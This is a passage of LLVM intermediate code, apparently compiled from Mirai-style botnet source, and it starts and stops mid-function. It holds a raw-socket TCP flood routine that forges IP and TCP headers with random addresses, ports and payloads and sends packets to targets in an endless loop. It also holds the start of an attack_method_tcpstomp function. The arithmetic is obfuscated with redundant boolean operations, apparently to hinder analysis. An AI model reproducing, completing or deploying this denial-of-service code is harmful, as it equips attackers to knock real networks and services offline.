  %106 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %106, i32* %10, align 4
  %107 = icmp eq i32 %106, -1
  br i1 %107, label %108, label %109

; <label>:108:                                    ; preds = %4
  br label %682

; <label>:109:                                    ; preds = %4
  store i32 1, i32* %9, align 4
  %110 = load i32, i32* %10, align 4
  %111 = bitcast i32* %9 to i8*
  %112 = call i32 @setsockopt(i32 %110, i32 0, i32 3, i8* %111, i32 4) #6
  %113 = icmp eq i32 %112, -1
  br i1 %113, label %114, label %117

; <label>:114:                                    ; preds = %109
  %115 = load i32, i32* %10, align 4
  %116 = call i32 @close(i32 %115)
  br label %682

; <label>:117:                                    ; preds = %109
  store i32 0, i32* %9, align 4
  br label %118

; <label>:118:                                    ; preds = %482, %117
  %119 = load i32, i32* %9, align 4
  %120 = load i8, i8* %5, align 1
  %121 = zext i8 %120 to i32
  %122 = icmp slt i32 %119, %121
  br i1 %122, label %123, label %489

; <label>:123:                                    ; preds = %118
  %124 = call noalias i8* @calloc(i64 1510, i64 1) #6
  %125 = load i8**, i8*** %11, align 8
  %126 = load i32, i32* %9, align 4
  %127 = sext i32 %126 to i64
  %128 = getelementptr inbounds i8*, i8** %125, i64 %127
  store i8* %124, i8** %128, align 8
  %129 = load i8**, i8*** %11, align 8
  %130 = load i32, i32* %9, align 4
  %131 = sext i32 %130 to i64
  %132 = getelementptr inbounds i8*, i8** %129, i64 %131
  %133 = load i8*, i8** %132, align 8
  %134 = bitcast i8* %133 to %struct.iphdr*
  store %struct.iphdr* %134, %struct.iphdr** %29, align 8
  %135 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %136 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %135, i64 1
  %137 = bitcast %struct.iphdr* %136 to %struct.tcphdr*
  store %struct.tcphdr* %137, %struct.tcphdr** %30, align 8
  %138 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %139 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %138, i64 1
  %140 = bitcast %struct.tcphdr* %139 to i8*
  store i8* %140, i8** %31, align 8
  %141 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %142 = bitcast %struct.iphdr* %141 to i8*
  %143 = load i8, i8* %142, align 4
  %144 = xor i8 15, -1
  %145 = xor i8 %143, %144
  %146 = and i8 %145, %143
  %147 = and i8 %143, 15
  %148 = xor i8 %146, -1
  %149 = xor i8 64, -1
  %150 = xor i8 79, -1
  %151 = and i8 %148, 79
  %152 = and i8 %146, %150
  %153 = and i8 %149, 79
  %154 = and i8 64, %150
  %155 = or i8 %151, %152
  %156 = or i8 %153, %154
  %157 = xor i8 %155, %156
  %158 = or i8 %148, %149
  %159 = xor i8 %158, -1
  %160 = or i8 79, %150
  %161 = and i8 %159, %160
  %162 = or i8 %157, %161
  %163 = or i8 %146, 64
  store i8 %162, i8* %142, align 4
  %164 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %165 = bitcast %struct.iphdr* %164 to i8*
  %166 = load i8, i8* %165, align 4
  %167 = xor i8 -16, -1
  %168 = xor i8 %166, %167
  %169 = and i8 %168, %166
  %170 = and i8 %166, -16
  %171 = xor i8 %169, -1
  %172 = xor i8 5, -1
  %173 = xor i8 -43, -1
  %174 = and i8 %171, -43
  %175 = and i8 %169, %173
  %176 = and i8 %172, -43
  %177 = and i8 5, %173
  %178 = or i8 %174, %175
  %179 = or i8 %176, %177
  %180 = xor i8 %178, %179
  %181 = or i8 %171, %172
  %182 = xor i8 %181, -1
  %183 = or i8 -43, %173
  %184 = and i8 %182, %183
  %185 = or i8 %180, %184
  %186 = or i8 %169, 5
  store i8 %185, i8* %165, align 4
  %187 = load i8, i8* %12, align 1
  %188 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %189 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %188, i32 0, i32 1
  store i8 %187, i8* %189, align 1
  %190 = load i32, i32* %26, align 4
  %191 = sext i32 %190 to i64
  %192 = sub i64 0, 40
  %193 = sub i64 0, %191
  %194 = add i64 %192, %193
  %195 = sub i64 0, %194
  %196 = add i64 40, %191
  %197 = trunc i64 %195 to i16
  %198 = call zeroext i16 @htons(i16 zeroext %197) #7
  %199 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %200 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %199, i32 0, i32 2
  store i16 %198, i16* %200, align 2
  %201 = load i16, i16* %13, align 2
  %202 = call zeroext i16 @htons(i16 zeroext %201) #7
  %203 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %204 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %203, i32 0, i32 3
  store i16 %202, i16* %204, align 4
  %205 = load i8, i8* %14, align 1
  %206 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %207 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %206, i32 0, i32 5
  store i8 %205, i8* %207, align 4
  %208 = load i8, i8* %15, align 1
  %209 = icmp ne i8 %208, 0
  br i1 %209, label %210, label %214

; <label>:210:                                    ; preds = %123
  %211 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %212 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %213 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %212, i32 0, i32 4
  store i16 %211, i16* %213, align 2
  br label %214

; <label>:214:                                    ; preds = %210, %123
  %215 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %216 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %215, i32 0, i32 6
  store i8 6, i8* %216, align 1
  %217 = load i32, i32* %28, align 4
  %218 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %219 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %218, i32 0, i32 8
  store i32 %217, i32* %219, align 4
  %220 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %221 = load i32, i32* %9, align 4
  %222 = sext i32 %221 to i64
  %223 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %220, i64 %222
  %224 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %223, i32 0, i32 1
  %225 = load i32, i32* %224, align 4
  %226 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %227 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %226, i32 0, i32 9
  store i32 %225, i32* %227, align 4
  %228 = load i16, i16* %16, align 2
  %229 = call zeroext i16 @htons(i16 zeroext %228) #7
  %230 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %231 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %230, i32 0, i32 0
  store i16 %229, i16* %231, align 4
  %232 = load i16, i16* %17, align 2
  %233 = call zeroext i16 @htons(i16 zeroext %232) #7
  %234 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %235 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %234, i32 0, i32 1
  store i16 %233, i16* %235, align 2
  %236 = load i32, i32* %18, align 4
  %237 = trunc i32 %236 to i16
  %238 = call zeroext i16 @htons(i16 zeroext %237) #7
  %239 = zext i16 %238 to i32
  %240 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %241 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %240, i32 0, i32 2
  store i32 %239, i32* %241, align 4
  %242 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %243 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %242, i32 0, i32 4
  %244 = load i16, i16* %243, align 4
  %245 = xor i16 %244, -1
  %246 = xor i16 -241, -1
  %247 = xor i16 20733, -1
  %248 = or i16 %245, %246
  %249 = or i16 20733, %247
  %250 = xor i16 %248, -1
  %251 = and i16 %250, %249
  %252 = and i16 %244, -241
  %253 = xor i16 %251, -1
  %254 = xor i16 80, -1
  %255 = xor i16 4521, -1
  %256 = and i16 %253, 4521
  %257 = and i16 %251, %255
  %258 = and i16 %254, 4521
  %259 = and i16 80, %255
  %260 = or i16 %256, %257
  %261 = or i16 %258, %259
  %262 = xor i16 %260, %261
  %263 = or i16 %253, %254
  %264 = xor i16 %263, -1
  %265 = or i16 4521, %255
  %266 = and i16 %264, %265
  %267 = or i16 %262, %266
  %268 = or i16 %251, 80
  store i16 %267, i16* %243, align 4
  %269 = load i8, i8* %20, align 1
  %270 = sext i8 %269 to i16
  %271 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %272 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %271, i32 0, i32 4
  %273 = load i16, i16* %272, align 4
  %274 = xor i16 1, -1
  %275 = xor i16 %270, %274
  %276 = and i16 %275, %270
  %277 = and i16 %270, 1
  %278 = shl i16 %276, 13
  %279 = xor i16 -8193, -1
  %280 = xor i16 %273, %279
  %281 = and i16 %280, %273
  %282 = and i16 %273, -8193
  %283 = xor i16 %281, -1
  %284 = xor i16 %278, -1
  %285 = xor i16 32757, -1
  %286 = and i16 %283, 32757
  %287 = and i16 %281, %285
  %288 = and i16 %284, 32757
  %289 = and i16 %278, %285
  %290 = or i16 %286, %287
  %291 = or i16 %288, %289
  %292 = xor i16 %290, %291
  %293 = or i16 %283, %284
  %294 = xor i16 %293, -1
  %295 = or i16 32757, %285
  %296 = and i16 %294, %295
  %297 = or i16 %292, %296
  %298 = or i16 %281, %278
  store i16 %297, i16* %272, align 4
  %299 = load i8, i8* %21, align 1
  %300 = sext i8 %299 to i16
  %301 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %302 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %301, i32 0, i32 4
  %303 = load i16, i16* %302, align 4
  %304 = xor i16 %300, -1
  %305 = xor i16 1, -1
  %306 = xor i16 -19350, -1
  %307 = or i16 %304, %305
  %308 = or i16 -19350, %306
  %309 = xor i16 %307, -1
  %310 = and i16 %309, %308
  %311 = and i16 %300, 1
  %312 = shl i16 %310, 12
  %313 = xor i16 %303, -1
  %314 = xor i16 -4097, -1
  %315 = xor i16 2382, -1
  %316 = or i16 %313, %314
  %317 = or i16 2382, %315
  %318 = xor i16 %316, -1
  %319 = and i16 %318, %317
  %320 = and i16 %303, -4097
  %321 = xor i16 %319, -1
  %322 = xor i16 %312, -1
  %323 = xor i16 31931, -1
  %324 = and i16 %321, 31931
  %325 = and i16 %319, %323
  %326 = and i16 %322, 31931
  %327 = and i16 %312, %323
  %328 = or i16 %324, %325
  %329 = or i16 %326, %327
  %330 = xor i16 %328, %329
  %331 = or i16 %321, %322
  %332 = xor i16 %331, -1
  %333 = or i16 31931, %323
  %334 = and i16 %332, %333
  %335 = or i16 %330, %334
  %336 = or i16 %319, %312
  store i16 %335, i16* %302, align 4
  %337 = load i8, i8* %22, align 1
  %338 = sext i8 %337 to i16
  %339 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %340 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %339, i32 0, i32 4
  %341 = load i16, i16* %340, align 4
  %342 = xor i16 1, -1
  %343 = xor i16 %338, %342
  %344 = and i16 %343, %338
  %345 = and i16 %338, 1
  %346 = shl i16 %344, 11
  %347 = xor i16 %341, -1
  %348 = xor i16 -2049, -1
  %349 = xor i16 7003, -1
  %350 = or i16 %347, %348
  %351 = or i16 7003, %349
  %352 = xor i16 %350, -1
  %353 = and i16 %352, %351
  %354 = and i16 %341, -2049
  %355 = and i16 %353, %346
  %356 = xor i16 %353, %346
  %357 = or i16 %355, %356
  %358 = or i16 %353, %346
  store i16 %357, i16* %340, align 4
  %359 = load i8, i8* %23, align 1
  %360 = sext i8 %359 to i16
  %361 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %362 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %361, i32 0, i32 4
  %363 = load i16, i16* %362, align 4
  %364 = xor i16 %360, -1
  %365 = xor i16 1, -1
  %366 = xor i16 -17148, -1
  %367 = or i16 %364, %365
  %368 = or i16 -17148, %366
  %369 = xor i16 %367, -1
  %370 = and i16 %369, %368
  %371 = and i16 %360, 1
  %372 = shl i16 %370, 10
  %373 = xor i16 -1025, -1
  %374 = xor i16 %363, %373
  %375 = and i16 %374, %363
  %376 = and i16 %363, -1025
  %377 = and i16 %375, %372
  %378 = xor i16 %375, %372
  %379 = or i16 %377, %378
  %380 = or i16 %375, %372
  store i16 %379, i16* %362, align 4
  %381 = load i8, i8* %24, align 1
  %382 = sext i8 %381 to i16
  %383 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %384 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %383, i32 0, i32 4
  %385 = load i16, i16* %384, align 4
  %386 = xor i16 1, -1
  %387 = xor i16 %382, %386
  %388 = and i16 %387, %382
  %389 = and i16 %382, 1
  %390 = shl i16 %388, 9
  %391 = xor i16 -513, -1
  %392 = xor i16 %385, %391
  %393 = and i16 %392, %385
  %394 = and i16 %385, -513
  %395 = xor i16 %393, -1
  %396 = xor i16 %390, -1
  %397 = xor i16 1558, -1
  %398 = and i16 %395, 1558
  %399 = and i16 %393, %397
  %400 = and i16 %396, 1558
  %401 = and i16 %390, %397
  %402 = or i16 %398, %399
  %403 = or i16 %400, %401
  %404 = xor i16 %402, %403
  %405 = or i16 %395, %396
  %406 = xor i16 %405, -1
  %407 = or i16 1558, %397
  %408 = and i16 %406, %407
  %409 = or i16 %404, %408
  %410 = or i16 %393, %390
  store i16 %409, i16* %384, align 4
  %411 = load i8, i8* %25, align 1
  %412 = sext i8 %411 to i16
  %413 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %414 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %413, i32 0, i32 4
  %415 = load i16, i16* %414, align 4
  %416 = xor i16 %412, -1
  %417 = xor i16 1, -1
  %418 = xor i16 -8307, -1
  %419 = or i16 %416, %417
  %420 = or i16 -8307, %418
  %421 = xor i16 %419, -1
  %422 = and i16 %421, %420
  %423 = and i16 %412, 1
  %424 = shl i16 %422, 8
  %425 = xor i16 %415, -1
  %426 = xor i16 -257, -1
  %427 = xor i16 16690, -1
  %428 = or i16 %425, %426
  %429 = or i16 16690, %427
  %430 = xor i16 %428, -1
  %431 = and i16 %430, %429
  %432 = and i16 %415, -257
  %433 = xor i16 %431, -1
  %434 = xor i16 %424, -1
  %435 = xor i16 1559, -1
  %436 = and i16 %433, 1559
  %437 = and i16 %431, %435
  %438 = and i16 %434, 1559
  %439 = and i16 %424, %435
  %440 = or i16 %436, %437
  %441 = or i16 %438, %439
  %442 = xor i16 %440, %441
  %443 = or i16 %433, %434
  %444 = xor i16 %443, -1
  %445 = or i16 1559, %435
  %446 = and i16 %444, %445
  %447 = or i16 %442, %446
  %448 = or i16 %431, %424
  store i16 %447, i16* %414, align 4
  %449 = call i32 @rand_next()
  %450 = xor i32 %449, -1
  %451 = xor i32 65535, -1
  %452 = xor i32 1081282308, -1
  %453 = or i32 %450, %451
  %454 = or i32 1081282308, %452
  %455 = xor i32 %453, -1
  %456 = and i32 %455, %454
  %457 = and i32 %449, 65535
  %458 = trunc i32 %456 to i16
  %459 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %460 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %459, i32 0, i32 5
  store i16 %458, i16* %460, align 2
  %461 = load i8, i8* %22, align 1
  %462 = icmp ne i8 %461, 0
  br i1 %462, label %463, label %479

; <label>:463:                                    ; preds = %214
  %464 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %465 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %464, i32 0, i32 4
  %466 = load i16, i16* %465, align 4
  %467 = xor i16 %466, -1
  %468 = xor i16 -2049, -1
  %469 = xor i16 -19565, -1
  %470 = or i16 %467, %468
  %471 = or i16 -19565, %469
  %472 = xor i16 %470, -1
  %473 = and i16 %472, %471
  %474 = and i16 %466, -2049
  %475 = and i16 %473, 2048
  %476 = xor i16 %473, 2048
  %477 = or i16 %475, %476
  %478 = or i16 %473, 2048
  store i16 %477, i16* %465, align 4
  br label %479

; <label>:479:                                    ; preds = %463, %214
  %480 = load i8*, i8** %31, align 8
  %481 = load i32, i32* %26, align 4
  call void @rand_str(i8* %480, i32 %481)
  br label %482

; <label>:482:                                    ; preds = %479
  %483 = load i32, i32* %9, align 4
  %484 = sub i32 0, %483
  %485 = sub i32 0, 1
  %486 = add i32 %484, %485
  %487 = sub i32 0, %486
  %488 = add nsw i32 %483, 1
  store i32 %487, i32* %9, align 4
  br label %118

; <label>:489:                                    ; preds = %118
  br label %490

; <label>:490:                                    ; preds = %681, %489
  store i32 0, i32* %9, align 4
  br label %491

; <label>:491:                                    ; preds = %676, %490
  %492 = load i32, i32* %9, align 4
  %493 = load i8, i8* %5, align 1
  %494 = zext i8 %493 to i32
  %495 = icmp slt i32 %492, %494
  br i1 %495, label %496, label %681

; <label>:496:                                    ; preds = %491
  %497 = load i8**, i8*** %11, align 8
  %498 = load i32, i32* %9, align 4
  %499 = sext i32 %498 to i64
  %500 = getelementptr inbounds i8*, i8** %497, i64 %499
  %501 = load i8*, i8** %500, align 8
  store i8* %501, i8** %32, align 8
  %502 = load i8*, i8** %32, align 8
  %503 = bitcast i8* %502 to %struct.iphdr*
  store %struct.iphdr* %503, %struct.iphdr** %33, align 8
  %504 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %505 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %504, i64 1
  %506 = bitcast %struct.iphdr* %505 to %struct.tcphdr*
  store %struct.tcphdr* %506, %struct.tcphdr** %34, align 8
  %507 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %508 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %507, i64 1
  %509 = bitcast %struct.tcphdr* %508 to i8*
  store i8* %509, i8** %35, align 8
  %510 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %511 = load i32, i32* %9, align 4
  %512 = sext i32 %511 to i64
  %513 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %510, i64 %512
  %514 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %513, i32 0, i32 2
  %515 = load i8, i8* %514, align 4
  %516 = zext i8 %515 to i32
  %517 = icmp slt i32 %516, 32
  br i1 %517, label %518, label %541

; <label>:518:                                    ; preds = %496
  %519 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %520 = load i32, i32* %9, align 4
  %521 = sext i32 %520 to i64
  %522 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %519, i64 %521
  %523 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %522, i32 0, i32 1
  %524 = load i32, i32* %523, align 4
  %525 = call i32 @ntohl(i32 %524) #7
  %526 = call i32 @rand_next()
  %527 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %528 = load i32, i32* %9, align 4
  %529 = sext i32 %528 to i64
  %530 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %527, i64 %529
  %531 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %530, i32 0, i32 2
  %532 = load i8, i8* %531, align 4
  %533 = zext i8 %532 to i32
  %534 = lshr i32 %526, %533
  %535 = sub i32 0, %534
  %536 = sub i32 %525, %535
  %537 = add i32 %525, %534
  %538 = call i32 @htonl(i32 %536) #7
  %539 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %540 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %539, i32 0, i32 9
  store i32 %538, i32* %540, align 4
  br label %541

; <label>:541:                                    ; preds = %518, %496
  %542 = load i32, i32* %28, align 4
  %543 = icmp eq i32 %542, -1
  br i1 %543, label %544, label %548

; <label>:544:                                    ; preds = %541
  %545 = call i32 @rand_next()
  %546 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %547 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %546, i32 0, i32 8
  store i32 %545, i32* %547, align 4
  br label %548

; <label>:548:                                    ; preds = %544, %541
  %549 = load i16, i16* %13, align 2
  %550 = zext i16 %549 to i32
  %551 = icmp eq i32 %550, 65535
  br i1 %551, label %552, label %565

; <label>:552:                                    ; preds = %548
  %553 = call i32 @rand_next()
  %554 = xor i32 %553, -1
  %555 = xor i32 65535, -1
  %556 = xor i32 -1966064760, -1
  %557 = or i32 %554, %555
  %558 = or i32 -1966064760, %556
  %559 = xor i32 %557, -1
  %560 = and i32 %559, %558
  %561 = and i32 %553, 65535
  %562 = trunc i32 %560 to i16
  %563 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %564 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %563, i32 0, i32 3
  store i16 %562, i16* %564, align 4
  br label %565

; <label>:565:                                    ; preds = %552, %548
  %566 = load i16, i16* %16, align 2
  %567 = zext i16 %566 to i32
  %568 = icmp eq i32 %567, 65535
  br i1 %568, label %569, label %582

; <label>:569:                                    ; preds = %565
  %570 = call i32 @rand_next()
  %571 = xor i32 %570, -1
  %572 = xor i32 65535, -1
  %573 = xor i32 -1749242832, -1
  %574 = or i32 %571, %572
  %575 = or i32 -1749242832, %573
  %576 = xor i32 %574, -1
  %577 = and i32 %576, %575
  %578 = and i32 %570, 65535
  %579 = trunc i32 %577 to i16
  %580 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %581 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %580, i32 0, i32 0
  store i16 %579, i16* %581, align 4
  br label %582

; <label>:582:                                    ; preds = %569, %565
  %583 = load i16, i16* %17, align 2
  %584 = zext i16 %583 to i32
  %585 = icmp eq i32 %584, 65535
  br i1 %585, label %586, label %599

; <label>:586:                                    ; preds = %582
  %587 = call i32 @rand_next()
  %588 = xor i32 %587, -1
  %589 = xor i32 65535, -1
  %590 = xor i32 63561940, -1
  %591 = or i32 %588, %589
  %592 = or i32 63561940, %590
  %593 = xor i32 %591, -1
  %594 = and i32 %593, %592
  %595 = and i32 %587, 65535
  %596 = trunc i32 %594 to i16
  %597 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %598 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %597, i32 0, i32 1
  store i16 %596, i16* %598, align 2
  br label %599

; <label>:599:                                    ; preds = %586, %582
  %600 = load i32, i32* %18, align 4
  %601 = icmp eq i32 %600, 65535
  br i1 %601, label %602, label %606

; <label>:602:                                    ; preds = %599
  %603 = call i32 @rand_next()
  %604 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %605 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %604, i32 0, i32 2
  store i32 %603, i32* %605, align 4
  br label %606

; <label>:606:                                    ; preds = %602, %599
  %607 = load i32, i32* %19, align 4
  %608 = icmp eq i32 %607, 65535
  br i1 %608, label %609, label %613

; <label>:609:                                    ; preds = %606
  %610 = call i32 @rand_next()
  %611 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %612 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %611, i32 0, i32 3
  store i32 %610, i32* %612, align 4
  br label %613

; <label>:613:                                    ; preds = %609, %606
  %614 = load i8, i8* %27, align 1
  %615 = icmp ne i8 %614, 0
  br i1 %615, label %616, label %619

; <label>:616:                                    ; preds = %613
  %617 = load i8*, i8** %35, align 8
  %618 = load i32, i32* %26, align 4
  call void @rand_str(i8* %617, i32 %618)
  br label %619

; <label>:619:                                    ; preds = %616, %613
  %620 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %621 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %620, i32 0, i32 7
  store i16 0, i16* %621, align 2
  %622 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %623 = bitcast %struct.iphdr* %622 to i16*
  %624 = call zeroext i16 @checksum_generic(i16* %623, i32 20)
  %625 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %626 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %625, i32 0, i32 7
  store i16 %624, i16* %626, align 2
  %627 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %628 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %627, i32 0, i32 6
  store i16 0, i16* %628, align 4
  %629 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %630 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %631 = bitcast %struct.tcphdr* %630 to i8*
  %632 = load i32, i32* %26, align 4
  %633 = sext i32 %632 to i64
  %634 = sub i64 20, 6622745016346080030
  %635 = add i64 %634, %633
  %636 = add i64 %635, 6622745016346080030
  %637 = add i64 20, %633
  %638 = trunc i64 %636 to i16
  %639 = call zeroext i16 @htons(i16 zeroext %638) #7
  %640 = load i32, i32* %26, align 4
  %641 = sext i32 %640 to i64
  %642 = sub i64 20, 6443000252639475201
  %643 = add i64 %642, %641
  %644 = add i64 %643, 6443000252639475201
  %645 = add i64 20, %641
  %646 = trunc i64 %644 to i32
  %647 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %629, i8* %631, i16 zeroext %639, i32 %646)
  %648 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %649 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %648, i32 0, i32 6
  store i16 %647, i16* %649, align 4
  %650 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %651 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %650, i32 0, i32 1
  %652 = load i16, i16* %651, align 2
  %653 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %654 = load i32, i32* %9, align 4
  %655 = sext i32 %654 to i64
  %656 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %653, i64 %655
  %657 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %656, i32 0, i32 0
  %658 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %657, i32 0, i32 1
  store i16 %652, i16* %658, align 2
  %659 = load i32, i32* %10, align 4
  %660 = load i8*, i8** %32, align 8
  %661 = load i32, i32* %26, align 4
  %662 = sext i32 %661 to i64
  %663 = sub i64 0, %662
  %664 = sub i64 40, %663
  %665 = add i64 40, %662
  %666 = bitcast %union.__CONST_SOCKADDR_ARG* %36 to %struct.sockaddr**
  %667 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %668 = load i32, i32* %9, align 4
  %669 = sext i32 %668 to i64
  %670 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %667, i64 %669
  %671 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %670, i32 0, i32 0
  %672 = bitcast %struct.sockaddr_in* %671 to %struct.sockaddr*
  store %struct.sockaddr* %672, %struct.sockaddr** %666, align 8
  %673 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %36, i32 0, i32 0
  %674 = load %struct.sockaddr*, %struct.sockaddr** %673, align 8
  %675 = call i64 @sendto(i32 %659, i8* %660, i64 %664, i32 16384, %struct.sockaddr* %674, i32 16)
  br label %676

; <label>:676:                                    ; preds = %619
  %677 = load i32, i32* %9, align 4
  %678 = sub i32 0, 1
  %679 = sub i32 %677, %678
  %680 = add nsw i32 %677, 1
  store i32 %679, i32* %9, align 4
  br label %491

; <label>:681:                                    ; preds = %491
  br label %490

; <label>:682:                                    ; preds = %114, %108
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpstomp(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.attack_stomp_data*, align 8
  %12 = alloca i8**, align 8
  %13 = alloca i8, align 1
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca i8, align 1
  %17 = alloca i16, align 2
  %18 = alloca i8, align 1
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i32, align 4
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.sockaddr_in, align 4
  %28 = alloca %struct.sockaddr_in, align 4
  %29 = alloca i32, align 4
  %30 = alloca [256 x i8], align 16
  %31 = alloca i64, align 8
  %32 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %33 = alloca i32, align 4
  %34 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %35 = alloca %struct.tcphdr*, align 8
  %36 = alloca %struct.iphdr*, align 8
  %37 = alloca %struct.tcphdr*, align 8
  %38 = alloca i8*, align 8
  %39 = alloca i8*, align 8
  %40 = alloca %struct.iphdr*, align 8
  %41 = alloca %struct.tcphdr*, align 8
  %42 = alloca i8*, align 8
  %43 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %44 = load i8, i8* %5, align 1
  %45 = zext i8 %44 to i64
  %46 = call noalias i8* @calloc(i64 %45, i64 16) #6
  %47 = bitcast i8* %46 to %struct.attack_stomp_data*
  store %struct.attack_stomp_data* %47, %struct.attack_stomp_data** %11, align 8
  %48 = load i8, i8* %5, align 1
  %49 = zext i8 %48 to i64
  %50 = call noalias i8* @calloc(i64 %49, i64 8) #6
  %51 = bitcast i8* %50 to i8**
  store i8** %51, i8*** %12, align 8
  %52 = load i8, i8* %7, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 2, i32 0)
  %55 = trunc i32 %54 to i8
  store i8 %55, i8* %13, align 1
  %56 = load i8, i8* %7, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %8, align 8
